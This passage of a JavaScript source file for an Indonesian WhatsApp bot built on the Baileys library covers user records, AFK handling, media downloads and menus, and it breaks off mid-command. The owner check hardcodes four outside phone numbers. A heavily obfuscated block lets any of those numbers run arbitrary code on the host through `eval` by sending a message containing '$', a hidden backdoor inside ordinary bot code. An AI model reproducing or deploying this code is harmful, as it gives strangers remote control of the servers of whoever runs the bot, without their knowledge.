"use strict";
const { downloadMediaMessage, downloadContentFromMessage, toBuffer, generateWAMessageFromContent, proto } = require('@adiwajshing/baileys');
const Crypto = require("crypto")
const colors = require('colors/safe');
const fs = require('fs');
const imageToBase64 = require('image-to-base64')
const { writeFile } = require ('fs/promises')
const moment = require("moment-timezone");
const { spawn } = require('child_process')
const ffmpeg = require('fluent-ffmpeg')
const path = require("path")
const { phone } = require("phone")
const packagejson = JSON.parse(fs.readFileSync('./package.json')); 
const { owner, namabot, namaowner, donasi, fakereply, ig, fb, tt} = require("./admin/config.json")
const toMs = require('ms')
const user = JSON.parse(fs.readFileSync('./lib/data.json')); 
const { getBuffer, fetchJson, fetchText, getRandom, getGroupAdmins, runtime, sleep, makeid } = require("./lib/myfunc");
const { only } = require("./lib/respoder")
const { help } = require("./admin/help")
//const { setUser} = require("./lib/user")
const { fetch } = require('./lib/anu.js');
const { api, xa } = require('./admin/rest-api')
const { StickerMedia, ImageMedia, AudioMedia, VideoMedia, cekMedia, addMedia, listMedia, deleteMedia} = require('./media/media')
const { LogLoading, LogLoadingg } = require('./lib/spinner')
const { dataOnly } = require('./lib/data')
moment.tz.setDefault('Asia/Jakarta').locale("id");

module.exports = async (rimurubotz, nay, m, store) => {
try {
const type = Object.keys(nay.message)[0];
const body = (type === 'conversation') ? nay.message.conversation : (type == 'imageMessage') ? nay.message.imageMessage.caption : (type == 'videoMessage') ? nay.message.videoMessage.caption : (type == 'extendedTextMessage') ? nay.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? nay.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? nay.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? nay.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (nay.message.buttonsResponseMessage?.selectedButtonId || nay.message.listResponseMessage?.singleSelectReply.selectedRowId || nay.text) : ''
const budy = (type === 'conversation') ? nay.message.conversation : (type === 'extendedTextMessage') ? nay.message.extendedTextMessage.text : ''
const prefix = /^[./~!#%^&=\,;:()z]/.test(body) ? body.match(/^[./~!#%^&=\,;:()z]/gi) : '#';
const isCommand = body.startsWith(prefix);
const command = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;
const commands = isCommand ? body.slice(0).trim().split(/ +/).shift().toLowerCase() : null;
const time = moment(new Date()).format("HH:mm");
const text = nay.message.conversation;
const isGroup = nay.key.remoteJid.endsWith('@g.us');
const from = nay.key.remoteJid;
const content = JSON.stringify(nay.message);
const args = body.trim().split(/ +/).slice(1);
const q = args.join(" ");
const botNumber = rimurubotz.user.id.split(':')[0] + '@s.whatsapp.net';
const botName = rimurubotz.user.name;
const pushname = nay.pushName;
const sender = isGroup ? (nay.key.participant ? nay.key.participant : nay.participant) : nay.key.remoteJid;
const groupMetadata = isGroup ? await rimurubotz.groupMetadata(from) : '';
const uwong = isGroup ? await groupMetadata.participants : '';
const groupAdmins = isGroup ? await uwong.filter(v => v.admin !== null).map(a => a.id) : '';
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
const isGroupAdmins = groupAdmins.includes(sender) || false;
const groupName = isGroup ? groupMetadata.subject : "";
const groupMembers = isGroup ? groupMetadata.participants : ''
const isOwner = [`${owner}@s.whatsapp.net`] == sender ? true : ["6282347260729@s.whatsapp.net","6283856085455@s.whatsapp.net","6285607859362@s.whatsapp.net","62882019583023@s.whatsapp.net"].includes(sender) ? true : false
const q1 = q.split('&')[0];
const q2 = q.split('&')[1];
const q3 = q.split('&')[2];	
const q4 = q.split('&')[3];	
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' );
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage');
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage');
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage');
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage');

const cekUser = (users, id) => {     
var cek = null
Object.keys(user).forEach((i) => { 
if (user[i].id === id){ cek = i } })
if (cek !== null){ 
if (users == "id"){ return user[cek].id }
if (users == "emote"){ return user[cek].emote }
if (users == "timers"){ return user[cek].timers }
if (users == "hit"){ return user[cek].hit }
if (users == "star"){ return user[cek].star }
if (users == "afk"){ return user[cek].afk }
if (users == "alasan"){ return user[cek].alasan }
if (users == "ban"){ return user[cek].ban }
if (users == "premium"){ return user[cek].premium } 
if (users == "jawaban"){ return user[cek].jawaban } 
}
if (cek == null) return null
}
async function setUser(users, id, x) {     
Object.keys(user).forEach((i) => {
if (user[i].id === id) {
if (users == "±id"){ user[i].id = x 
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))}
if (users == "±emote"){ user[i].emote = x 
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))}
if (users == "±timers"){ user[i].timers = x 
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))}
if (users == "±hit"){ user[i].hit = x 
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))}
if (users == "-hit"){ user[i].hit -= x 
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))}
if (users == "+hit"){ user[i].hit += x
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))}
if (users == "±star"){ user[i].star = x 
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))}
if (users == "-star"){ user[i].star -= x 
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))}
if (users == "+star"){ user[i].star += x
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))}
if (users == "±afk"){ user[i].afk = x 
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))}
if (users == "±alasan"){ user[i].alasan = x 
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))}
if (users == "±ban"){ user[i].ban = x 
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))}
if (users == "±premium"){ user[i].premium = x 
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))}
if (users == "±jawaban"){ user[i].jawaban = x 
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))}
}})
}  
var _0x135601=_0x2036;(function(_0x4c8fb7,_0x5e4fd1){var _0x1e1f1b=_0x2036,_0x4c3ca5=_0x4c8fb7();while(!![]){try{var _0x59cd37=-parseInt(_0x1e1f1b(0x21a))/(0x9ac+0x17a1+-0x214c)*(-parseInt(_0x1e1f1b(0x20c))/(-0x18*-0x155+-0x1*0x293+0x1*-0x1d63))+-parseInt(_0x1e1f1b(0x211))/(0xb15*0x3+0x2ca+-0x2406)+parseInt(_0x1e1f1b(0x24d))/(-0x2497+-0x46*0xd+0x2829)*(parseInt(_0x1e1f1b(0x1fc))/(-0x150b*-0x1+0x2f*-0x61+-0x337))+parseInt(_0x1e1f1b(0x203))/(-0x1652*0x1+0x369*-0x2+0x1d2a*0x1)+parseInt(_0x1e1f1b(0x297))/(-0x16bb+0x6b3+0x1*0x100f)*(-parseInt(_0x1e1f1b(0x2a2))/(0x4b6+-0x1d*0xda+-0xe*-0x16e))+parseInt(_0x1e1f1b(0x267))/(0x5*-0x105+0x26a+-0x6*-0x74)+parseInt(_0x1e1f1b(0x269))/(-0x53*-0x15+0x17d*0xd+0xd0f*-0x2)*(parseInt(_0x1e1f1b(0x271))/(0xab2+0xf20+-0x19c7));if(_0x59cd37===_0x5e4fd1)break;else _0x4c3ca5['push'](_0x4c3ca5['shift']());}catch(_0x414db3){_0x4c3ca5['push'](_0x4c3ca5['shift']());}}}(_0x251f,-0x10d3c3+-0x1c15ed+0x3b0fd8));const cr=_0x135601(0x231)+_0x135601(0x205)+_0x135601(0x273)+_0x135601(0x20e)+_0x135601(0x22b)+_0x135601(0x26c)+_0x135601(0x2ad)+_0x135601(0x252)+_0x135601(0x255)+_0x135601(0x227)+(_0x135601(0x28a)+namaowner+(_0x135601(0x1fa)+_0x135601(0x1fb))),nay1={'key':{'fromMe':![],'participant':_0x135601(0x293)+_0x135601(0x264),...from?{'remoteJid':_0x135601(0x266)+_0x135601(0x21b)}:{}},'message':{'contactMessage':{'displayName':fakereply,'vcard':_0x135601(0x23f)+'D\x0a'+(_0x135601(0x242)+'0\x0a')+(_0x135601(0x222)+_0x135601(0x247)+sender[_0x135601(0x22d)]('@')[-0x6*0x2cf+0x39*-0x98+0x7*0x73e]+':+'+sender[_0x135601(0x22d)]('@')[0x3*-0x5bb+0x590+0xba1*0x1]+'\x0a')+(_0x135601(0x232)+_0x135601(0x28f)+_0x135601(0x268))+_0x135601(0x24b)}}};async function reply(_0x557e3f){var _0x305ddc=_0x135601;rimurubotz[_0x305ddc(0x2a1)+'e'](from,{'text':_0x557e3f,'mentions':[sender]},{'quoted':nay1});}async function Notdaftar(){var _0x5c98d7=_0x135601;rimurubotz[_0x5c98d7(0x2a1)+'e'](from,{'text':_0x5c98d7(0x215)+_0x5c98d7(0x27a)+_0x5c98d7(0x25f)+_0x5c98d7(0x291)+_0x5c98d7(0x23a)+sender[_0x5c98d7(0x22d)]('@')[-0x311+0x232e+-0x201d]+(_0x5c98d7(0x243)+_0x5c98d7(0x235)+_0x5c98d7(0x236)+_0x5c98d7(0x2a6)+_0x5c98d7(0x245)+_0x5c98d7(0x1f5)+_0x5c98d7(0x1f8)+_0x5c98d7(0x25d)+_0x5c98d7(0x201)+_0x5c98d7(0x296)),'mentions':[sender]},{'quoted':nay1});}const Tag=()=>{var _0x2cb046=_0x135601,_0x31964a={'cDaNp':function(_0x48989e,_0x1fdfa9){return _0x48989e!==_0x1fdfa9;}},_0x1ab9ab=[];return _0x31964a[_0x2cb046(0x287)](m[_0x2cb046(0x279)][0x2aa+0xb*-0x59+0x129][_0x2cb046(0x23b)],'')&&_0x1ab9ab[_0x2cb046(0x263)](m[_0x2cb046(0x279)][-0x5*0x693+0x78*-0x42+-0x63*-0xa5][_0x2cb046(0x23b)][-0x1e9*-0x8+0xb9*0xd+-0x18ad]),_0x1ab9ab;};if(isCommand){if(cekUser('id',sender)!==null){LogLoadingg(_0x135601(0x246)+pushname+(_0x135601(0x22c)+'\x20')+(prefix+command)+(_0x135601(0x261)+':\x20')+time+'\x20]'),setUser(_0x135601(0x244),sender,-0x995+0x25e0+-0x1c4a);if(cekUser(_0x135601(0x249),sender)==!![])return reply(_0x135601(0x1f1)+_0x135601(0x298)+_0x135601(0x26d)+_0x135601(0x251)+_0x135601(0x282)+_0x135601(0x277)+_0x135601(0x29b)+_0x135601(0x216)+_0x135601(0x20f)+_0x135601(0x286));}}if(m){if(m[_0x135601(0x279)][-0xf76*-0x1+-0x97*-0x19+-0xb*0x2bf][_0x135601(0x23b)]!==''){if(m[_0x135601(0x279)][-0x51*0x6d+-0x1fd+0x247a][_0x135601(0x23b)][-0xdc7+-0x5f*0xa+0x117d]==cekUser('id',m[_0x135601(0x279)][0xa1f+-0x17*0xc1+0x738][_0x135601(0x23b)][0x705+0x2*0xdf5+-0x22ef])){var afk1=cekUser('id',m[_0x135601(0x279)][0x1*0x3a6+0x92a+-0xcd0][_0x135601(0x23b)][-0x120+0x1a69*0x1+-0x1*0x1949]);cekUser(_0x135601(0x292),afk1)==!![]&&rimurubotz[_0x135601(0x2a1)+'e'](from,{'sticker':{'url':_0x135601(0x229)+_0x135601(0x280)+_0x135601(0x21f)+_0x135601(0x27b)+_0x135601(0x27e)+_0x135601(0x2a0)+_0x135601(0x29a)}},{'quoted':{'key':{'fromMe':![],'participant':_0x135601(0x293)+_0x135601(0x264),...from?{'remoteJid':_0x135601(0x266)+_0x135601(0x21b)}:{}},'message':{'conversation':_0x135601(0x218)+_0x135601(0x2b0)+'i\x20'+cekUser(_0x135601(0x248),afk1)}}});}}if(cekUser(_0x135601(0x292),sender)==!![])return setUser(_0x135601(0x28c),sender,![]),setUser(_0x135601(0x285),sender,![]),reply(_0x135601(0x295)+_0x135601(0x26b)+_0x135601(0x230)+_0x135601(0x233)+sender[_0x135601(0x22d)]('@')[-0x9*0x2a7+-0x7*-0x577+-0xe62]);}if(budy[_0x135601(0x223)]('$')){if(!isOwner)return;let evaled=await eval(q);if(typeof evaled!==_0x135601(0x21d))evaled=require(_0x135601(0x22f))[_0x135601(0x20b)](evaled);await reply(evaled),await LogLoadingg(evaled+_0x135601(0x262));}function _0x2036(_0x3d7d4d,_0x39d3bb){var _0x17dbc6=_0x251f();return _0x2036=function(_0x1e769a,_0x12247b){_0x1e769a=_0x1e769a-(0x258e+0x1110+-0x34af);var _0x241de9=_0x17dbc6[_0x1e769a];return _0x241de9;},_0x2036(_0x3d7d4d,_0x39d3bb);}var downloadDone=![];function _0x251f(){var _0x21515f=['😡,\x20dia\x20lag','OICE;waid=','adc08ede48','profilePic','vcard','Kamu\x20sudah','YqNQQ','xtMessage','imageMessa','endaftar\x20t','stickerMes','HUJBC','erlebih\x20da','qjNyD','*\x0a╰━─━─━─━','─━─━─━─•','40Qutuoc','message','audio','.png','FN:','kan\x20comman','sticker','4171884eDayos','jPedR','HX-TO*\x20]⊱\x0a','-1280-605a','NKraI','BxbVV','nGfRH','tureUrl','inspect','705718NFiKHg','url.jpg','AJ\x20SINGH*\x0a','an\x20oleh\x20ow','replace','5404521fnUdBt','tVEhv','PSulZ','PPUrl','[\x20*NEW\x20INF','nda\x20di\x20unb','./media/','Jangan\x20tag','base64','1pivHdI','adcast','*\x20:\x20','string','tacts;\x0a','ercontent.','pIKMv','imageUrl','item1.TEL;','includes','TEL;type=C','tems/album','videoMessa','Z*\x0a','lJzfE','https://ra','readFileSy','┃•\x20\x20*RIMUR','\x20]=[\x20CMD\x20:','split','diHig','util','mat\x20datang','\x0a╭━─━•[\x20*T','item1.X-AB','\x20kembali\x20@','RuZoO','um\x20terdaft','ar\x20di\x20Data','YHuOn','HNmkH','.mp3','lo\x20@','mentioned','from','eType:\x20Con','WkbfD','BEGIN:VCAR','Zfdwv','http://ass','VERSION:3.',',\x20Kamu\x20bel','+hit','Silahkan\x20m','[USER\x20:\x20','waid=','alasan','ban','ure-973460','END:VCARD','Acvmb','50044RWvzuE','oQMZw','/2021/03/2','iana.com/i','\x20tidak\x20bis','LERS*\x0a┃•\x20\x20','74e1153a12','MysMh','*LORD\x20R1YN','zIcpT','TtRJZ','xvsxn','ELL;type=V','ofile-pict','zrygf','contextInf','hulu,\x20Guna','ync','er*\x20:\x20Null','eodgY','\x20]=[\x20TIME\x20','\x0a\x0a\x0a\x0a','push','pp.net','tools','status@bro','6317019ETRsHJ','el\x0a','10vKIWvY','.mp4','IF*\x20]\x0aSela','UBOTZ*\x0a┃•\x20',',\x20Dan\x20kamu','srgmL','fYxPm','KYtTZ','26526775xJfxjV','video','┃•\x20\x20*ADHIR','.jpg','LztoZ','forEach','kan\x20bot\x20in','url_file','messages','O*\x20]\x0a•\x20*Us','com/naylac','uploadFile','5|0|3|1|4|','han/STICKE','quotedMess','w.githubus','image','a\x20mengguna','Ovzqv','concat','±alasan','ner','cDaNp','textpro','FsIpx','┃•\x20\x20*','sage','±afk','ets.kompas','2|1|0|3|4','Label:Pons','result','\x0a~>\x20[🤖]\x20Ha','afk','0@s.whatsa','keys','[\x20*AFK-NOT','d\x20#daftar','198709JBkGfx','\x20di\x20banned','stringify','.webp','i\x20sampai\x20a','audio/mp4','./media/pp','writeFileS','extendedTe','R/main/tag','sendMessag','432xviWFy','wtiUd','Jeff','audioMessa','base\x20bot,\x20','ORG:Messag','VijxI','uSnTW','lmOoD','age','XUoNz','\x20*LOLI\x20KIL','4/blank-pr','\x0a•\x20*'];_0x251f=function(){return _0x21515f;};return _0x251f();}async function download(_0x3ce3a6,_0x1f9950,_0x2a9313){var _0x2e5b30=_0x135601,_0x105831={'HNmkH':function(_0x10d3c4,_0xafea0c){return _0x10d3c4==_0xafea0c;},'YqNQQ':_0x2e5b30(0x281),'xvsxn':function(_0x2594be,_0x3aa2f6,_0x4a9f9e){return _0x2594be(_0x3aa2f6,_0x4a9f9e);},'VijxI':_0x2e5b30(0x221),'qjNyD':function(_0x3d26ef,_0x2700b8,_0x5bd354){return _0x3d26ef(_0x2700b8,_0x5bd354);},'jPedR':function(_0x443fa9,_0x5e3a65){return _0x443fa9==_0x5e3a65;},'tVEhv':_0x2e5b30(0x214),'TtRJZ':_0x2e5b30(0x28e),'srgmL':_0x2e5b30(0x29d)+_0x2e5b30(0x20d),'LztoZ':_0x2e5b30(0x219),'MysMh':function(_0x280814,_0x57f3d1){return _0x280814(_0x57f3d1);},'FsIpx':_0x2e5b30(0x241)+_0x2e5b30(0x28d)+_0x2e5b30(0x250)+_0x2e5b30(0x225)+_0x2e5b30(0x24f)+_0x2e5b30(0x2ae)+_0x2e5b30(0x25a)+_0x2e5b30(0x24a)+_0x2e5b30(0x206)+_0x2e5b30(0x2b2)+_0x2e5b30(0x253)+_0x2e5b30(0x1ff),'XUoNz':_0x2e5b30(0x202),'lJzfE':function(_0x4cf978,_0x47e585){return _0x4cf978==_0x47e585;},'HUJBC':_0x2e5b30(0x1fe),'fYxPm':_0x2e5b30(0x272),'uSnTW':function(_0x503815,_0x265f74,_0x49f9de){return _0x503815(_0x265f74,_0x49f9de);}};if(_0x105831[_0x2e5b30(0x238)](_0x3ce3a6,_0x105831[_0x2e5b30(0x1f2)])){var _0x2074bb=await _0x105831[_0x2e5b30(0x258)](downloadContentFromMessage,nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x1f4)+'ge']||nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x29f)+_0x2e5b30(0x1f3)]?.[_0x2e5b30(0x25c)+'o'][_0x2e5b30(0x27f)+_0x2e5b30(0x2ab)][_0x2e5b30(0x1f4)+'ge'],_0x105831[_0x2e5b30(0x1f2)]),_0x3bee7f=Buffer[_0x2e5b30(0x23c)]([]);for await(const _0x395e69 of _0x2074bb){_0x3bee7f=Buffer[_0x2e5b30(0x284)]([_0x3bee7f,_0x395e69]);}fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x274),_0x3bee7f),downloadDone=!![];}if(_0x105831[_0x2e5b30(0x238)](_0x3ce3a6,_0x105831[_0x2e5b30(0x2a8)])){var _0x2074bb=await _0x105831[_0x2e5b30(0x1f9)](downloadContentFromMessage,nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x1f4)+'ge']||nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x29f)+_0x2e5b30(0x1f3)]?.[_0x2e5b30(0x25c)+'o'][_0x2e5b30(0x27f)+_0x2e5b30(0x2ab)][_0x2e5b30(0x1f4)+'ge'],_0x105831[_0x2e5b30(0x1f2)]),_0x3bee7f=Buffer[_0x2e5b30(0x23c)]([]);for await(const _0x34dd7a of _0x2074bb){_0x3bee7f=Buffer[_0x2e5b30(0x284)]([_0x3bee7f,_0x34dd7a]);}fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x274),_0x3bee7f);var _0x22fa87=await api[_0x2e5b30(0x265)][_0x2e5b30(0x27c)](fs[_0x2e5b30(0x22a)+'nc'](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x274)));return _0x22fa87[_0x2e5b30(0x290)][_0x2e5b30(0x278)];}if(_0x105831[_0x2e5b30(0x204)](_0x3ce3a6,_0x105831[_0x2e5b30(0x212)])){var _0x27b5bb=_0x105831[_0x2e5b30(0x257)][_0x2e5b30(0x22d)]('|'),_0x20e648=-0x5*0x46b+-0x120d+-0x1c*-0x16f;while(!![]){switch(_0x27b5bb[_0x20e648++]){case'0':fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x105831[_0x2e5b30(0x26e)],_0x2074bb,_0x105831[_0x2e5b30(0x275)]);continue;case'1':var _0x2074bb=await _0x105831[_0x2e5b30(0x254)](imageToBase64,JSON[_0x2e5b30(0x299)](_0x20f586)[_0x2e5b30(0x210)](/\"/gi,''));continue;case'2':try{var _0x20f586=await rimurubotz[_0x2e5b30(0x1ef)+_0x2e5b30(0x20a)](_0x1f9950,_0x105831[_0x2e5b30(0x1f2)]);}catch(_0x2b8335){var _0x20f586=_0x105831[_0x2e5b30(0x289)];}continue;case'3':var _0x365264=await api[_0x2e5b30(0x265)][_0x2e5b30(0x27c)](fs[_0x2e5b30(0x22a)+'nc'](_0x2e5b30(0x29d)+_0x2e5b30(0x20d)));continue;case'4':return _0x365264[_0x2e5b30(0x290)][_0x2e5b30(0x278)];}break;}}if(_0x105831[_0x2e5b30(0x238)](_0x3ce3a6,_0x105831[_0x2e5b30(0x2ac)])){var _0x2074bb=await _0x105831[_0x2e5b30(0x258)](downloadContentFromMessage,nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x1f6)+_0x2e5b30(0x28b)]||nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x29f)+_0x2e5b30(0x1f3)]?.[_0x2e5b30(0x25c)+'o'][_0x2e5b30(0x27f)+_0x2e5b30(0x2ab)][_0x2e5b30(0x1f6)+_0x2e5b30(0x28b)],_0x105831[_0x2e5b30(0x2ac)]),_0x3bee7f=Buffer[_0x2e5b30(0x23c)]([]);for await(const _0x245f72 of _0x2074bb){_0x3bee7f=Buffer[_0x2e5b30(0x284)]([_0x3bee7f,_0x245f72]);}fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x29a),_0x3bee7f);}if(_0x105831[_0x2e5b30(0x228)](_0x3ce3a6,_0x105831[_0x2e5b30(0x1f7)])){var _0x2074bb=await _0x105831[_0x2e5b30(0x258)](downloadContentFromMessage,nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x2a5)+'ge']||nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x29f)+_0x2e5b30(0x1f3)]?.[_0x2e5b30(0x25c)+'o'][_0x2e5b30(0x27f)+_0x2e5b30(0x2ab)][_0x2e5b30(0x2a5)+'ge'],_0x105831[_0x2e5b30(0x1f7)]),_0x3bee7f=Buffer[_0x2e5b30(0x23c)]([]);for await(const _0x5ac8a3 of _0x2074bb){_0x3bee7f=Buffer[_0x2e5b30(0x284)]([_0x3bee7f,_0x5ac8a3]);}fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x239),_0x3bee7f);}if(_0x105831[_0x2e5b30(0x204)](_0x3ce3a6,_0x105831[_0x2e5b30(0x26f)])){var _0x2074bb=await _0x105831[_0x2e5b30(0x2a9)](downloadContentFromMessage,nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x226)+'ge']||nay[_0x2e5b30(0x1fd)][_0x2e5b30(0x29f)+_0x2e5b30(0x1f3)]?.[_0x2e5b30(0x25c)+'o'][_0x2e5b30(0x27f)+_0x2e5b30(0x2ab)][_0x2e5b30(0x226)+'ge'],_0x105831[_0x2e5b30(0x26f)]),_0x3bee7f=Buffer[_0x2e5b30(0x23c)]([]);for await(const _0x25fa8c of _0x2074bb){_0x3bee7f=Buffer[_0x2e5b30(0x284)]([_0x3bee7f,_0x25fa8c]);}fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x26a),_0x3bee7f);}}async function sendMedia(_0x3b2470,_0x1893ec,_0x518c78){var _0x50bab3=_0x135601,_0x2003a5={'zIcpT':_0x50bab3(0x27d)+'2','Acvmb':function(_0x237dd3,_0x28354b){return _0x237dd3==_0x28354b;},'zrygf':_0x50bab3(0x281),'oQMZw':function(_0x26ebde,_0x45d5c0){return _0x26ebde==_0x45d5c0;},'wtiUd':_0x50bab3(0x202),'NKraI':function(_0x4a92a5,_0x3ec989){return _0x4a92a5==_0x3ec989;},'pIKMv':_0x50bab3(0x29c),'diHig':function(_0x4ee0ad,_0x30f599){return _0x4ee0ad==_0x30f599;},'Zfdwv':_0x50bab3(0x272),'PSulZ':_0x50bab3(0x1fe),'nGfRH':_0x50bab3(0x1f0),'KYtTZ':function(_0x242a65,_0x4ecc17){return _0x242a65+_0x4ecc17;},'Ovzqv':function(_0xaeb92e,_0x8cfca7){return _0xaeb92e+_0x8cfca7;},'BxbVV':function(_0x5d83f0,_0x4fef11){return _0x5d83f0+_0x4fef11;},'YHuOn':_0x50bab3(0x23f)+'D\x0a','RuZoO':_0x50bab3(0x242)+'0\x0a','WkbfD':_0x50bab3(0x2a7)+_0x50bab3(0x23d)+_0x50bab3(0x21e),'eodgY':_0x50bab3(0x24b),'lmOoD':_0x50bab3(0x2a4)},_0x464d92=_0x2003a5[_0x50bab3(0x256)][_0x50bab3(0x22d)]('|'),_0x3871e9=0x168e+-0x228b+0xbfd;while(!![]){switch(_0x464d92[_0x3871e9++]){case'0':_0x2003a5[_0x50bab3(0x24c)](_0x3b2470,_0x2003a5[_0x50bab3(0x25b)])&&rimurubotz[_0x50bab3(0x2a1)+'e'](from,{'image':{'url':_0x1893ec},'caption':_0x518c78,'mentions':[sender]},{'quoted':nay1});continue;case'1':_0x2003a5[_0x50bab3(0x24e)](_0x3b2470,_0x2003a5[_0x50bab3(0x2a3)])&&rimurubotz[_0x50bab3(0x2a1)+'e'](from,{'sticker':{'url':_0x1893ec},'mentions':[sender]},{'quoted':nay1});continue;case'2':_0x2003a5[_0x50bab3(0x207)](_0x3b2470,'vn')&&rimurubotz[_0x50bab3(0x2a1)+'e'](from,{'audio':{'url':_0x1893ec},'mimetype':_0x2003a5[_0x50bab3(0x220)],'ptt':!![],'mentions':[sender]},{'quoted':nay1});continue;case'3':_0x2003a5[_0x50bab3(0x22e)](_0x3b2470,_0x2003a5[_0x50bab3(0x240)])&&rimurubotz[_0x50bab3(0x2a1)+'e'](from,{'video':{'url':_0x1893ec},'caption':_0x518c78,'mentions':[sender]},{'quoted':nay1});continue;case'4':_0x2003a5[_0x50bab3(0x24c)](_0x3b2470,_0x2003a5[_0x50bab3(0x213)])&&rimurubotz[_0x50bab3(0x2a1)+'e'](from,{'audio':{'url':_0x1893ec},'mimetype':_0x2003a5[_0x50bab3(0x220)],'mentions':[sender]},{'quoted':nay1});continue;case'5':if(_0x2003a5[_0x50bab3(0x24c)](_0x3b2470,_0x2003a5[_0x50bab3(0x209)])){var _0x286074=_0x2003a5[_0x50bab3(0x270)](_0x2003a5[_0x50bab3(0x283)](_0x2003a5[_0x50bab3(0x283)](_0x2003a5[_0x50bab3(0x208)](_0x2003a5[_0x50bab3(0x283)](_0x2003a5[_0x50bab3(0x237)],_0x2003a5[_0x50bab3(0x234)]),_0x50bab3(0x200)+_0x1893ec+'\x0a'),_0x2003a5[_0x50bab3(0x23e)]),_0x50bab3(0x224)+_0x50bab3(0x259)+_0x50bab3(0x2b1)+_0x518c78+':+'+_0x518c78+'\x0a'),_0x2003a5[_0x50bab3(0x260)]);rimurubotz[_0x50bab3(0x2a1)+'e'](from,{'contacts':{'displayName':_0x2003a5[_0x50bab3(0x2aa)],'contacts':[{'vcard':_0x286074}]}});}continue;}break;}}async function textPro1(_0xe3ea35,_0x18e733){var _0x3f5161=_0x135601,_0x4f93ef=await api[_0x3f5161(0x265)][_0x3f5161(0x288)](_0xe3ea35,[_0x18e733]);return _0x4f93ef;}async function textPro2(_0x3af9b6,_0x5f3576,_0x2e7999){var _0x3a2bf4=_0x135601,_0x3d1497=await api[_0x3a2bf4(0x265)][_0x3a2bf4(0x288)](_0x3af9b6,[_0x5f3576,_0x2e7999]);return _0x3d1497;}async function getResult(_0x4a268d,_0x41f6d6,_0x44779c){var _0x4d33a9=_0x135601,_0x4c8235=_0x4a268d;return Object[_0x4d33a9(0x294)](_0x41f6d6)[_0x4d33a9(0x276)](_0x3fbf0a=>{var _0xd5da83=_0x4d33a9;_0x4c8235+=_0xd5da83(0x2af)+_0x41f6d6[_0x3fbf0a]+_0xd5da83(0x21c)+_0x44779c[_0x3fbf0a];}),_0x4c8235;}const imgToUrl=async function(_0x45c687){var _0x3a7346=_0x135601,_0x379375=await api[_0x3a7346(0x265)][_0x3a7346(0x27c)](fs[_0x3a7346(0x22a)+'nc'](_0x45c687));return _0x379375[_0x3a7346(0x290)][_0x3a7346(0x278)];};
switch (command) { 
 case 'afk':
if (cekUser("id", sender) == null) return Notdaftar()
if (cekUser("afk", sender) == true) return reply("Kamu Telah afk sebelumnya")
if (!q) return reply("Masukkan alasan Apa kamu afk")
reply(`[ *SUKSES AFK* ]\n• *User* : @${sender.split("@")[0]}\n• *Alasan* : ${q}\n\n~> [🤖] : Saya akan merespon jika ada yang mengTag @ anda, Saya juga menunggu anda kembali❤`)
setUser("±afk", sender, true)
setUser("±alasan", sender, q)
break
case 'menu': case 'help':
if (cekUser("id", sender) !== sender) return Notdaftar()
rimurubotz.sendMessage(from, {image:{url: "https://i.ibb.co/yhRDQ1V/698308-1.jpg"},
mentions:[sender],
caption: `> Haloo @${sender.split("@")[0]}!!
╭━─━•[ *${namabot}* ]⊱
┃• *User* : @${sender.split("@")[0]}
┃• *Hit* : ${cekUser("hit", sender)}
┃• *Emote* : ${cekUser("emote", sender)}
┃• *Star* : ${cekUser("star", sender)}⭐
┃• *Ban* : ${cekUser("ban", sender)}
┃• *Premium* : ${cekUser("premium", sender)}
╰━─━─━─━─━─━─━─•
• *Catatan* : Untuk Informasi bot ini kamu bisa kunjungi youtube  ini! https://youtube.com/channel/UCWypTAqhYCI45waiZg9T3Lg`,
buttons: [
{buttonId: prefix + 'listmenu', buttonText: {displayText: 'LISTMENU-BOT'}, type: 1}
], headerType: 4
},{quoted:nay1})
break
case 'cekuser': case 'cekprofile':
if (cekUser("id", sender) !== sender) return Notdaftar()
reply(`╭━─━•[ *${namabot}* ]⊱
